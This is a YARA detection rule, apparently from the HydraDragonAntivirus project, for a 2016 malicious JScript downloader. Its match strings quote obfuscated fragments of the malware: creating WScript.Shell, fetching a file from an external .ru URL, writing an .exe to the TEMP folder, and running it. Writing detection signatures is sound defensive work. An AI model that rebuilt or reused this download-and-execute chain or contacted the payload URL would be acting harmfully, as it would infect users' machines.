rule sig_20160401_fc52fd656eb49e29d2559c542e17c9af {
  meta:
    description = "datamaliciousorder - file 20160401_fc52fd656eb49e29d2559c542e17c9af.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ec2fc269c7ea88206f3d4c057e7a1086e73c7abc770503fb0360bdf652cf5811"

  strings:
    $s1  = "var DmRk = function SeZs() {return WScript[IjzAwc](\"WScript\"+\".Shell\");}(), YehYr = 11;" fullword ascii
    $s2  = "function IuNjn(WxmIv, AadLd){DukCg = DukCg * 1; return WxmIv - AadLd;};" fullword ascii
    $s3  = "if (VsuPoq[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s4  = "VsuPoq[ZwuCqz](\"G\" + \"ET\", \"http://teamlight-pro.ru/j7esp\", false);" fullword ascii
    $s5  = "function PpFd() {return DmRk[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"QwyxMblh5N5h.ex\" + \"e\";};" fullword ascii
    $s6  = "function OvIo(){return KyTu + \"\";};" fullword ascii
    $s7  = "function VwSi() {return ((PulNx == true) && (PulNx == DlCh)) ? 1 : DukCg;};" fullword ascii
    $s8  = "return IuNjn(GldAs, HvMas);" fullword ascii
    $s9  = "}while (IfqAb);" fullword ascii
    $s10 = "function LikUy(CmGz) {var PnWvd = (1, 2, 3, 4, 5, CmGz); return PnWvd;};" fullword ascii
    $s11 = "var DlCh = false;" fullword ascii
    $s12 = "var QxSi = new this[\"Date\"]();" fullword ascii
    $s13 = "function BkxIir(RiGwe){DmRk[\"R\"+\"un\"](RiGwe, DukCg, DukCg);};" fullword ascii
    $s14 = "function OikMf(){return 23;};" fullword ascii
    $s15 = "function NpXme(){return IjzAwc;};" fullword ascii
    $s16 = "function PxmPq()" fullword ascii
    $s17 = "PulNx = true; " fullword ascii
    $s18 = "var JkMvh = false;" fullword ascii
    $s19 = "DlCh = true; " fullword ascii
    $s20 = "var PulNx = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}